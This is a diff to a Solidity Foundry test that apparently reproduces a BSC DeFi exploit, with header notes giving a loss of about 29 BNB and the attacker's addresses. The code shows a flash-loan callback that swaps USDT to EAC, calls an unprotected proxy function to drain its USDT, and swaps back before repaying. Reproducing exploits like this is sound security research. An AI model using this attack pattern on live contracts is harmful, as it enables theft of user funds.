@@ -3,6 +3,11 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IDPPOracle} from "src/interfaces/IDPPOracle.sol";
 // @KeyInfo - Total Lost : ~$29BNB
 // Attacker : https://bscscan.com/address/0x27e981348c2d1f5b2227c182a9d0ed46eed84946
 // Attack Contract : https://bscscan.com/address/0x20dcf125f0563417d257b98a116c3fea4f0b2db2
@@ -36,7 +41,7 @@ contract ContractTest is Test {
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         swap(usdt, eac, IERC20(usdt).balanceOf(address(this)));
-        proxy.call(abi.encodeWithSelector(0xe6a24c3f, IERC20(usdt).balanceOf(proxy)));
+        (bool success4,) = proxy.call(abi.encodeWithSelector(0xe6a24c3f, IERC20(usdt).balanceOf(proxy)));
         swap(eac, usdt, IERC20(eac).balanceOf(address(this)));
         // pay back
         IERC20(usdt).transfer(msg.sender, 300_000_000_000_000_008_388_608);
